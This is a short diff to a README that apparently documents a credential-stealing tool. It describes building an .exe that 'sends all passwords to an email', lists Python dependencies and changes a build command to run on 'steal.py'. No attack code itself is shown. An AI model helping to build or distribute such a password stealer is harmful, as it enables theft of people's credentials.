@@ -200,12 +200,13 @@ an example for building `.exe` file (sends all passwords to an email)
 
 ### Requirements
 ```shell
-pip install --upgrade pyinstaller selenium-driverless aiosqlite pywin32 pycryptodome aiofiles aiohttp
+pip install --upgrade pyinstaller
 ```
++ all requirements for the python script to build
 
 ### build
 ```shell
-python build.py
+python build.py "steal.py"
 ```
 
 ### run
